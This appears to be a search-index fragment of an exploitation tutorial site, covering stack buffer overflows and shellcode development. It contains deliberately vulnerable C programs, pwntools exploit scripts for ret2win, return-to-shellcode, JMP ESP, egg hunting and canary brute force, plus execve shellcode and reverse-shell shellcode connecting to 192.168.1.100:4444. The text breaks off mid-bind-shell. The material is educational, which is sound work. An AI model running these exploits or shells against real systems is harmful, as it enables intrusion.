\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Local Variables   \u2502 \u2190 Buffer location\n\u2502   (including buffer)\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLow Address\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#vulnerable-code-examples","title":"Vulnerable Code Examples","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#basic-stack-buffer-overflow","title":"Basic Stack Buffer Overflow","text":"<pre><code>// vuln1.c - Basic overflow\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[64];              // 64-byte buffer\n    printf(\"Enter input: \");\n    gets(buffer);                 // Dangerous: no bounds checking!\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vulnerable_function();\n    printf(\"Returned to main safely\\n\");\n    return 0;\n}\n</code></pre> <p>Compilation: <pre><code># Disable modern protections for learning\ngcc -fno-stack-protector -no-pie -z execstack -o vuln1 vuln1.c\n\n# Check protections\nchecksec vuln1\n</code></pre></p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#strcpy-overflow","title":"Strcpy Overflow","text":"<pre><code>// vuln2.c - strcpy overflow\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid process_input(char *input) {\n    char buffer[32];\n    strcpy(buffer, input);        // Dangerous: no length check!\n    printf(\"Processed: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s &lt;input&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    process_input(argv[1]);\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#off-by-one-error","title":"Off-by-One Error","text":"<pre><code>// vuln3.c - Off-by-one\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid copy_string(char *src) {\n    char dest[16];\n    int i;\n\n    // Copy until null terminator or buffer size\n    for (i = 0; i &lt;= 16 &amp;&amp; src[i] != '\\0'; i++) {  // BUG: i &lt;= 16 should be i &lt; 16\n        dest[i] = src[i];\n    }\n\n    printf(\"Copied: %s\\n\", dest);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) return 1;\n    copy_string(argv[1]);\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#exploitation-methodology","title":"Exploitation Methodology","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#step-1-crash-analysis","title":"Step 1: Crash Analysis","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\n# Generate crash\ncontext.log_level = 'debug'\np = process('./vuln1')\n\n# Send long input to cause crash\npayload = b'A' * 100\np.sendline(payload)\np.wait()\n\nprint(\"Program crashed - investigating core dump\")\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#step-2-finding-the-offset","title":"Step 2: Finding the Offset","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef find_offset():\n    # Generate unique pattern\n    pattern = cyclic(100)\n\n    # Start process and send pattern\n    p = process('./vuln1')\n    p.sendline(pattern)\n    p.wait()\n\n    # Analyze core dump\n    core = Coredump('./core')\n\n    # Find offset where return address was overwritten\n    crash_address = core.read(core.rsp, 8)\n    offset = cyclic_find(crash_address[:4])\n\n    print(f\"Offset found: {offset}\")\n    return offset\n\noffset = find_offset()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#manual-offset-finding","title":"Manual Offset Finding","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef manual_offset_finding():\n    # Try different offsets\n    for i in range(60, 80):\n        try:\n            p = process('./vuln1')\n\n            # Create payload with known value at potential return address\n            payload = b'A' * i + b'BBBB'\n            p.sendline(payload)\n            p.wait()\n\n            # Check if we hit the return address\n            core = Coredump('./core')\n            if core.read(core.rsp, 4) == b'BBBB':\n                print(f\"Offset found: {i}\")\n                return i\n\n        except:\n            continue\n\n    print(\"Offset not found in range\")\n    return None\n\nmanual_offset_finding()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#step-3-control-flow-hijacking","title":"Step 3: Control Flow Hijacking","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\ndef control_eip():\n    offset = 72  # Discovered offset\n\n    # Try to control return address\n    p = process('./vuln1')\n\n    payload = b'A' * offset\n    payload += p64(0x4141414142424242)  # Controlled return address\n\n    p.sendline(payload)\n    p.wait()\n\n    # Verify we control RIP\n    core = Coredump('./core')\n    rip = core.read(core.rsp, 8)\n    print(f\"RIP controlled: {hex(u64(rip))}\")\n\ncontrol_eip()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#classic-exploitation-techniques","title":"Classic Exploitation Techniques","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#ret2win-return-to-win-function","title":"Ret2Win (Return to Win Function)","text":"<pre><code>// ret2win.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid win() {\n    printf(\"Congratulations! You win!\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid vulnerable() {\n    char buffer[64];\n    printf(\"Enter input: \");\n    gets(buffer);\n}\n\nint main() {\n    printf(\"ret2win challenge\\n\");\n    vulnerable();\n    return 0;\n}\n</code></pre> <p>Exploit: <pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.binary = './ret2win'\nelf = ELF('./ret2win')\n\ndef exploit():\n    p = process('./ret2win')\n\n    # Find win function address\n    win_addr = elf.symbols['win']\n    print(f\"Win function at: {hex(win_addr)}\")\n\n    # Build payload\n    offset = 72\n    payload = b'A' * offset\n    payload += p64(win_addr)\n\n    # Send payload\n    p.sendline(payload)\n    p.interactive()\n\nexploit()\n</code></pre></p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#return-to-shellcode","title":"Return to Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.binary = './vuln1'\n\ndef ret2shellcode():\n    p = process('./vuln1')\n\n    # Generate shellcode\n    shellcode = asm(shellcraft.sh())\n\n    # Find buffer address (requires leak or guessing)\n    buffer_addr = 0x7fffffffe000  # Example address\n\n    # Build payload\n    offset = 72\n    payload = shellcode\n    payload += b'A' * (offset - len(shellcode))\n    payload += p64(buffer_addr)  # Return to buffer\n\n    p.sendline(payload)\n    p.interactive()\n\nret2shellcode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#jmp-esp-technique-x86","title":"JMP ESP Technique (x86)","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'i386'\n\ndef jmp_esp_exploit():\n    # Find JMP ESP gadget\n    elf = ELF('./vuln32')\n\n    # Search for JMP ESP instruction (0xFFE4)\n    jmp_esp = None\n    for addr in elf.search(b'\\xff\\xe4'):\n        jmp_esp = addr\n        break\n\n    if not jmp_esp:\n        print(\"JMP ESP not found\")\n        return\n\n    print(f\"JMP ESP found at: {hex(jmp_esp)}\")\n\n    # Generate shellcode\n    shellcode = asm(shellcraft.sh())\n\n    # Build payload\n    offset = 68  # 32-bit offset\n    payload = b'A' * offset\n    payload += p32(jmp_esp)      # Overwrite return address\n    payload += shellcode         # Shellcode on stack after return\n\n    p = process('./vuln32')\n    p.sendline(payload)\n    p.interactive()\n\njmp_esp_exploit()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#advanced-buffer-overflow-techniques","title":"Advanced Buffer Overflow Techniques","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#egg-hunting","title":"Egg Hunting","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef egg_hunter():\n    context.arch = 'i386'\n\n    # Egg marker (should be unique)\n    egg = b'W00T'\n\n    # Egg hunter shellcode\n    egghunter = asm(f'''\n    next_page:\n        or dx, 0x0fff\n    next_addr:\n        inc edx\n        lea ebx, [edx+4]\n        push byte +0x21\n        pop eax\n        int 0x80\n        cmp al, 0xf2\n        jz next_page\n\n        mov eax, {u32(egg)}    # First half of egg\n        mov edi, edx\n        scasd\n        jnz next_addr\n\n        mov eax, {u32(egg)}    # Second half of egg  \n        scasd\n        jnz next_addr\n\n        jmp edi                # Jump to shellcode after egg\n    ''')\n\n    # Full shellcode with egg marker\n    full_shellcode = egg + egg + asm(shellcraft.sh())\n\n    # Exploit payload\n    offset = 72\n    payload = egghunter.ljust(offset, b'A')\n    payload += p64(buffer_address)  # Return to egghunter\n\n    return payload, full_shellcode\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#multi-stage-payloads","title":"Multi-stage Payloads","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef multi_stage_exploit():\n    context.arch = 'amd64'\n\n    # Stage 1: Read larger payload\n    stage1 = asm(f'''\n        # read(stdin, buffer, size)\n        xor rax, rax        # sys_read\n        xor rdi, rdi        # stdin\n        mov rsi, {hex(buffer_addr)}  # buffer address\n        mov rdx, 1000       # size\n        syscall\n\n        # Jump to read payload\n        mov rax, {hex(buffer_addr)}\n        jmp rax\n    ''')\n\n    # Stage 2: Full shellcode\n    stage2 = asm(shellcraft.sh())\n\n    # Initial overflow\n    offset = 72\n    payload1 = stage1.ljust(offset, b'A')\n    payload1 += p64(buffer_addr)\n\n    return payload1, stage2\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#protection-mechanisms-and-bypasses","title":"Protection Mechanisms and Bypasses","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#stack-canaries","title":"Stack Canaries","text":"<pre><code>// canary_example.c\n#include &lt;stdio.h&gt;\n\nvoid vulnerable() {\n    char buffer[64];\n    printf(\"Buffer at: %p\\n\", buffer);\n    printf(\"Enter input: \");\n    gets(buffer);\n    printf(\"Function returned normally\\n\");\n}\n\nint main() {\n    vulnerable();\n    return 0;\n}\n</code></pre> <p>Compile with canary: <pre><code>gcc -fstack-protector-all -o canary_vuln canary_example.c\n</code></pre></p> <p>Canary Bypass - Bruteforce: <pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport string\n\ndef bruteforce_canary():\n    context.log_level = 'error'  # Reduce noise\n\n    canary = b''\n\n    # Bruteforce canary byte by byte\n    for i in range(8):  # 64-bit canary\n        for c in range(256):\n            p = process('./canary_vuln')\n\n            # Payload to overwrite one more byte of canary\n            payload = b'A' * 72  # Fill buffer + saved rbp\n            payload += canary + bytes([c])\n\n            p.sendline(payload)\n\n            # Check if program crashed\n            try:\n                output = p.recvall(timeout=1)\n                if b\"stack smashing detected\" not in output:\n                    canary += bytes([c])\n                    print(f\"Canary byte {i}: 0x{c:02x}\")\n                    p.close()\n                    break\n            except:\n                pass\n\n            p.close()\n\n    print(f\"Full canary: {canary.hex()}\")\n    return canary\n</code></pre></p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#aslr-and-information-leaks","title":"ASLR and Information Leaks","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef leak_stack_address():\n    \"\"\"Use format string to leak stack addresses\"\"\"\n    p = process('./format_vuln')\n\n    # Leak stack values using format string\n    payload = b'%lx.' * 20  # Leak 20 stack values\n    p.sendline(payload)\n\n    response = p.recvline()\n    leaks = response.split(b'.')\n\n    for i, leak in enumerate(leaks):\n        try:\n            addr = int(leak, 16)\n            if 0x7fff00000000 &lt;= addr &lt;= 0x7fffffffffff:  # Stack range\n                print(f\"Stack address {i}: 0x{addr:016x}\")\n        except:\n            continue\n\n    p.close()\n\ndef defeat_aslr_with_leak():\n    \"\"\"Combine information leak with buffer overflow\"\"\"\n\n    # Phase 1: Leak addresses\n    p = process('./vuln_with_leak')\n\n    # Trigger information leak\n    p.sendline(b'1')  # Menu option to leak\n    leak = p.recvline()\n\n    # Parse leaked address\n    stack_leak = int(leak.split()[-1], 16)\n    buffer_addr = stack_leak - 0x100  # Calculate buffer address\n\n    print(f\"Leaked stack: 0x{stack_leak:016x}\")\n    print(f\"Buffer at: 0x{buffer_addr:016x}\")\n\n    # Phase 2: Exploit with known address\n    p.sendline(b'2')  # Menu option for overflow\n\n    shellcode = asm(shellcraft.sh())\n    payload = shellcode.ljust(72, b'A')\n    payload += p64(buffer_addr)  # Return to shellcode\n\n    p.sendline(payload)\n    p.interactive()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#debugging-buffer-overflows","title":"Debugging Buffer Overflows","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#gdb-analysis","title":"GDB Analysis","text":"<pre><code># Compile with debug info\ngcc -g -fno-stack-protector -no-pie -o vuln_debug vuln.c\n\n# Start GDB\ngdb ./vuln_debug\n\n# Useful GDB commands for buffer overflow analysis\n(gdb) set disassembly-flavor intel\n(gdb) break vulnerable\n(gdb) run\n(gdb) info registers\n(gdb) x/32wx $rsp          # Examine stack\n(gdb) x/10i $rip           # Examine instructions\n(gdb) stepi                # Step one instruction\n(gdb) bt                   # Backtrace\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#gdb-with-pwntools","title":"GDB with pwntools","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.terminal = ['tmux', 'splitw', '-h']\n\ndef debug_exploit():\n    # Start process with GDB attached\n    p = gdb.debug('./vuln1', '''\n        set disassembly-flavor intel\n        break vulnerable\n        break *vulnerable+50\n        continue\n    ''')\n\n    # Send payload after GDB is ready\n    raw_input(\"Press enter when GDB is ready...\")\n\n    offset = 72\n    payload = b'A' * offset + p64(0x4141414141414141)\n\n    p.sendline(payload)\n    p.interactive()\n\ndebug_exploit()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#core-dump-analysis","title":"Core Dump Analysis","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef analyze_crash():\n    # Generate crash\n    p = process('./vuln1')\n    p.sendline(b'A' * 100)\n    p.wait()\n\n    # Analyze core dump\n    core = Coredump('./core')\n\n    print(f\"Crash at RIP: 0x{core.rip:016x}\")\n    print(f\"RSP: 0x{core.rsp:016x}\")\n\n    # Show stack contents\n    print(\"\\nStack contents:\")\n    for i in range(10):\n        addr = core.rsp + i * 8\n        try:\n            value = u64(core.read(addr, 8))\n            print(f\"0x{addr:016x}: 0x{value:016x}\")\n        except:\n            break\n\n    # Show registers\n    print(f\"\\nRegisters:\")\n    print(f\"RAX: 0x{core.rax:016x}\")\n    print(f\"RBX: 0x{core.rbx:016x}\")\n    print(f\"RCX: 0x{core.rcx:016x}\")\n\nanalyze_crash()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#mitigation-techniques","title":"Mitigation Techniques","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#input-validation","title":"Input Validation","text":"<pre><code>// secure_input.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid safe_input() {\n    char buffer[64];\n    printf(\"Enter input (max 63 chars): \");\n\n    // Safe input with bounds checking\n    if (fgets(buffer, sizeof(buffer), stdin)) {\n        // Remove newline if present\n        size_t len = strlen(buffer);\n        if (len &gt; 0 &amp;&amp; buffer[len-1] == '\\n') {\n            buffer[len-1] = '\\0';\n        }\n\n        printf(\"You entered: %s\\n\", buffer);\n    }\n}\n\n// Safe string copy\nvoid safe_copy(const char *src, char *dest, size_t dest_size) {\n    strncpy(dest, src, dest_size - 1);\n    dest[dest_size - 1] = '\\0';  // Ensure null termination\n}\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#modern-compiler-protections","title":"Modern Compiler Protections","text":"<pre><code># Compile with all protections\ngcc -fstack-protector-strong \\\n    -fPIE -pie \\\n    -D_FORTIFY_SOURCE=2 \\\n    -Wl,-z,relro,-z,now \\\n    -o secure_program program.c\n\n# Check applied protections\nchecksec secure_program\n</code></pre>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#practice-challenges","title":"Practice Challenges","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#challenge-1-basic-overflow","title":"Challenge 1: Basic Overflow","text":"<p>Write an exploit for a simple gets() overflow to call a win function.</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#challenge-2-offset-discovery","title":"Challenge 2: Offset Discovery","text":"<p>Find the exact offset for a buffer overflow without using cyclic patterns.</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#challenge-3-shellcode-injection","title":"Challenge 3: Shellcode Injection","text":"<p>Exploit a buffer overflow to execute custom shellcode.</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#challenge-4-canary-bypass","title":"Challenge 4: Canary Bypass","text":"<p>Bypass stack canaries using information leaks or bruteforce.</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#key-takeaways","title":"Key Takeaways","text":"<p>Buffer Overflow Fundamentals</p> <ul> <li>Input validation is critical - Always check buffer bounds</li> <li>Understand memory layout - Know where return addresses are stored</li> <li>Use pattern generation - Cyclic patterns help find exact offsets</li> <li>Control flow hijacking - Overwriting return addresses enables code execution</li> <li>Modern protections exist - Canaries, ASLR, and DEP make exploitation harder</li> </ul> <p>Common Mistakes</p> <ul> <li>Using dangerous functions like gets(), strcpy() without bounds checking</li> <li>Assuming buffer sizes without validation</li> <li>Off-by-one errors in loop conditions</li> <li>Not null-terminating strings properly</li> <li>Ignoring compiler warnings about unsafe functions</li> </ul> <p>Exploitation Tips</p> <ul> <li>Start with simple ret2win challenges</li> <li>Use debugging tools to understand crashes</li> <li>Practice finding offsets with different methods</li> <li>Learn to work around modern protections</li> <li>Understand the relationship between C code and assembly</li> </ul> <p>Next: Shellcode Development</p>"},{"location":"binary-exploitation/fundamentals/03-shellcode/","title":"Shellcode Development","text":"<p>Shellcode is a small piece of code used as the payload in the exploitation of software vulnerabilities. It's called \"shellcode\" because it typically starts a command shell, but modern shellcode can perform various malicious activities.</p>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#understanding-shellcode","title":"Understanding Shellcode","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#what-is-shellcode","title":"What is Shellcode?","text":"<p>Shellcode characteristics: 1. Position-independent - Works regardless of memory location 2. Self-contained - No external dependencies 3. Compact - Minimal size for fitting in exploits 4. Null-byte free - Avoids string termination issues</p>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#shellcode-categories","title":"Shellcode Categories","text":"<pre><code>Shellcode Types:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Local Shellcode   \u2502 \u2190 Executes on target machine\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Remote Shellcode  \u2502 \u2190 Connects back to attacker\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Download &amp; Exec   \u2502 \u2190 Downloads and runs payload\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Staged Shellcode  \u2502 \u2190 Multi-stage payload delivery\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#assembly-fundamentals-for-shellcode","title":"Assembly Fundamentals for Shellcode","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#system-calls-in-assembly","title":"System Calls in Assembly","text":"<pre><code>; Linux x86_64 system call convention:\n; rax = syscall number\n; rdi = 1st argument\n; rsi = 2nd argument  \n; rdx = 3rd argument\n; r10 = 4th argument\n; r8  = 5th argument\n; r9  = 6th argument\n\n; execve(\"/bin/sh\", NULL, NULL)\nmov rax, 59        ; sys_execve\nmov rdi, string    ; filename\nmov rsi, 0         ; argv (NULL)\nmov rdx, 0         ; envp (NULL)\nsyscall\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#basic-shellcode-structure","title":"Basic Shellcode Structure","text":"<pre><code>; execve_shellcode.asm\nsection .text\nglobal _start\n\n_start:\n    ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\n\n    ; Clear registers\n    xor eax, eax\n    xor ebx, ebx\n    xor ecx, ecx\n    xor edx, edx\n\n    ; Push \"/bin/sh\\0\" onto stack\n    push edx           ; null terminator\n    push 0x68732f2f    ; \"//sh\" (little endian)\n    push 0x6e69622f    ; \"/bin\" (little endian)\n\n    ; Set up arguments\n    mov ebx, esp       ; filename = \"/bin/sh\"\n    push edx           ; NULL (end of argv array)\n    push ebx           ; \"/bin/sh\" (argv[0])\n    mov ecx, esp       ; argv array\n\n    ; System call\n    mov al, 11         ; sys_execve (32-bit)\n    int 0x80\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#writing-shellcode","title":"Writing Shellcode","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#simple-execve-shellcode-64-bit","title":"Simple execve Shellcode (64-bit)","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\n# Generate shellcode using pwntools\ncontext.arch = 'amd64'\n\ndef generate_execve_shellcode():\n    \"\"\"Generate execve(\"/bin/sh\") shellcode\"\"\"\n\n    # Method 1: Using pwntools\n    shellcode = asm(shellcraft.sh())\n    print(f\"Pwntools shellcode ({len(shellcode)} bytes):\")\n    print(shellcode.hex())\n\n    # Method 2: Manual assembly\n    manual_shellcode = asm('''\n        xor rsi, rsi        /* argv = NULL */\n        xor rdx, rdx        /* envp = NULL */\n\n        /* Push \"/bin/sh\\0\" */\n        push rsi            /* null terminator */\n        mov rdi, 0x68732f2f6e69622f\n        push rdi\n\n        mov rdi, rsp        /* filename = \"/bin/sh\" */\n        mov rax, 59         /* sys_execve */\n        syscall\n    ''')\n\n    print(f\"\\nManual shellcode ({len(manual_shellcode)} bytes):\")\n    print(manual_shellcode.hex())\n\n    return shellcode\n\ndef test_shellcode(shellcode):\n    \"\"\"Test shellcode in isolated environment\"\"\"\n\n    # Create executable memory page\n    import mmap\n    import ctypes\n\n    # Allocate executable memory\n    mem = mmap.mmap(-1, len(shellcode), \n                   mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,\n                   mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)\n\n    # Copy shellcode to memory\n    mem.write(shellcode)\n    mem.seek(0)\n\n    # Create function pointer and execute\n    func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(mem)))\n\n    print(\"Executing shellcode...\")\n    func()  # This will spawn a shell\n\n# Generate and test\nshellcode = generate_execve_shellcode()\n# test_shellcode(shellcode)  # Uncomment to test\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#32-bit-shellcode","title":"32-bit Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'i386'\n\ndef x86_execve_shellcode():\n    \"\"\"Generate 32-bit execve shellcode\"\"\"\n\n    shellcode = asm('''\n        xor eax, eax        /* Clear eax */\n        xor ebx, ebx        /* Clear ebx */\n        xor ecx, ecx        /* Clear ecx */\n        xor edx, edx        /* Clear edx */\n\n        /* Push \"/bin/sh\\0\" onto stack */\n        push edx            /* null terminator */\n        push 0x68732f2f     /* \"//sh\" */\n        push 0x6e69622f     /* \"/bin\" */\n\n        mov ebx, esp        /* ebx = \"/bin/sh\" */\n\n        /* Set up argv array */\n        push edx            /* NULL (end of array) */\n        push ebx            /* \"/bin/sh\" (argv[0]) */\n        mov ecx, esp        /* ecx = argv */\n\n        mov al, 11          /* sys_execve */\n        int 0x80            /* system call */\n    ''')\n\n    print(f\"32-bit shellcode ({len(shellcode)} bytes):\")\n    print(shellcode.hex())\n\n    return shellcode\n\nx86_execve_shellcode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#null-free-shellcode","title":"Null-Free Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\n\ndef null_free_shellcode():\n    \"\"\"Generate shellcode without null bytes\"\"\"\n\n    # Problematic: contains null bytes\n    bad_shellcode = asm('''\n        mov rax, 59         /* Contains null bytes! */\n        mov rdi, 0x68732f2f6e69622f\n        syscall\n    ''')\n\n    print(f\"Bad shellcode (with nulls): {bad_shellcode.hex()}\")\n\n    # Null-free version\n    good_shellcode = asm('''\n        /* Clear registers without null bytes */\n        xor rax, rax\n        xor rdi, rdi\n        xor rsi, rsi\n        xor rdx, rdx\n\n        /* Push \"/bin/sh\" */\n        push rax            /* null terminator */\n\n        /* Use mov with 32-bit immediate to avoid nulls */\n        mov edi, 0x68732f2f  /* \"//sh\" */\n        push rdi\n        mov edi, 0x6e69622f  /* \"/bin\" */\n        push rdi\n\n        mov rdi, rsp        /* rdi = \"/bin/sh\" */\n\n        /* Use 8-bit register to set syscall number */\n        mov al, 59          /* sys_execve */\n        syscall\n    ''')\n\n    print(f\"Good shellcode (null-free): {good_shellcode.hex()}\")\n\n    # Check for null bytes\n    if b'\\x00' in good_shellcode:\n        print(\"WARNING: Shellcode contains null bytes!\")\n    else:\n        print(\"Shellcode is null-free!\")\n\n    return good_shellcode\n\nnull_free_shellcode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#advanced-shellcode-techniques","title":"Advanced Shellcode Techniques","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#reverse-shell-shellcode","title":"Reverse Shell Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\n\ndef reverse_shell_shellcode(ip, port):\n    \"\"\"Generate reverse shell shellcode\"\"\"\n\n    # Convert IP to hex\n    ip_parts = ip.split('.')\n    ip_hex = struct.pack('!I', \n                        (int(ip_parts[0]) &lt;&lt; 24) + \n                        (int(ip_parts[1]) &lt;&lt; 16) + \n                        (int(ip_parts[2]) &lt;&lt; 8) + \n                        int(ip_parts[3]))\n\n    # Convert port to hex (network byte order)\n    port_hex = struct.pack('!H', port)\n\n    shellcode = asm(f'''\n        /* socket(AF_INET, SOCK_STREAM, 0) */\n        xor rax, rax\n        xor rdi, rdi\n        xor rsi, rsi\n        xor rdx, rdx\n\n        mov al, 41          /* sys_socket */\n        mov dil, 2          /* AF_INET */\n        mov sil, 1          /* SOCK_STREAM */\n        syscall\n\n        mov r8, rax         /* save socket fd */\n\n        /* connect(sockfd, &amp;addr, sizeof(addr)) */\n        xor rax, rax\n        mov al, 42          /* sys_connect */\n        mov rdi, r8         /* sockfd */\n\n        /* Build sockaddr_in on stack */\n        xor r9, r9\n        push r9             /* padding */\n\n        /* IP address (little endian) */\n        mov r9d, {hex(u32(ip_hex))}\n        push r9\n\n        /* Port and family */\n        mov r9w, {hex(u16(port_hex))}\n        shl r9, 16\n        add r9w, 2          /* AF_INET */\n        push r9\n\n        mov rsi, rsp        /* &amp;addr */\n        mov dl, 16          /* sizeof(addr) */\n        syscall\n\n        /* dup2(sockfd, 0/1/2) */\n        mov rdi, r8         /* sockfd */\n        xor rsi, rsi        /* stdin */\n        mov al, 33          /* sys_dup2 */\n        syscall\n\n        mov rdi, r8         /* sockfd */\n        mov sil, 1          /* stdout */\n        mov al, 33          /* sys_dup2 */\n        syscall\n\n        mov rdi, r8         /* sockfd */\n        mov sil, 2          /* stderr */\n        mov al, 33          /* sys_dup2 */\n        syscall\n\n        /* execve(\"/bin/sh\", NULL, NULL) */\n        xor rax, rax\n        push rax\n        mov rdi, 0x68732f2f6e69622f\n        push rdi\n        mov rdi, rsp\n        xor rsi, rsi\n        xor rdx, rdx\n        mov al, 59          /* sys_execve */\n        syscall\n    ''')\n\n    print(f\"Reverse shell shellcode for {ip}:{port} ({len(shellcode)} bytes)\")\n    print(shellcode.hex())\n\n    return shellcode\n\n# Generate reverse shell for 192.168.1.100:4444\nreverse_shell_shellcode(\"192.168.1.100\", 4444)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#bind-shell-shellcode","title":"Bind Shell Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\n\ndef bind_shell_shellcode(port):\n    \"\"\"Generate bind shell shellcode\"\"\"\n\n    port_hex = struct.pack('!H', port)\n\n    shellcode = asm(f'''\n        /* socket(AF_INET, SOCK_STREAM, 0) */\n        xor rax, rax\n        mov al, 41          /* sys_socket */\n        xor rdi, rdi\n        mov dil, 2          /* AF_INET */\n        xor rsi, rsi\n        mov sil, 1          /* SOCK_STREAM */\n        xor rdx, rdx        /* protocol = 0 */\n        syscall\n\n        mov r8, rax         /* save socket fd */\n\n        /* bind(sockfd, &amp;addr, sizeof(addr)) */\n        xor rax, rax\n        mov al, 49          /* sys_bind */\n        mov rdi, r8         /* sockfd */\n\n        /* Build sockaddr_in */\n        xor r9, r9\n        push r9             /* 